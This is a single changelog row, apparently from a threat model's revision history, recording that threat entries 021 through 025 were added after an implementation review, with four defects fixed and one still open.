| 2026-07-26 | Added THREAT-021 through THREAT-025: defects found during implementation review (4 fixed, 1 open) | M9 Docs Reconciliation |
